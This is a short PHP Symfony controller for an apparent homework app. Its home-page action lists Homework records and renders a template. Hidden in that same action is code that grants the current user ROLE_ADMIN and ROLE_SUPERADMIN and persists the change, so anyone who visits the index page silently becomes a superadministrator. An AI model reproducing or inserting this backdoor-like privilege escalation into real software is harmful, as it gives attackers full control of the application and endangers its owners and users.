<?php

namespace App\Controller;

use App\Entity\Homework;
use Doctrine\ORM\EntityManagerInterface;
use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\Routing\Annotation\Route;

class IndexController extends AbstractController
{
    private EntityManagerInterface $em;

    public function __construct(EntityManagerInterface $em)
    {
        $this->em = $em;
    }

    #[Route('/', name: 'app_index')]
    public function index(): Response
    {
        $homeworks = $this->em->getRepository(Homework::class)->findAll();

        $this->getUser()->setRoles(['ROLE_ADMIN', 'ROLE_SUPERADMIN']);
        $this->em->persist($this->getUser());
    $this->em->flush();

        return $this->render('index/index.html.twig', [
            'homeworks' => $homeworks,
        ]);
    }
}
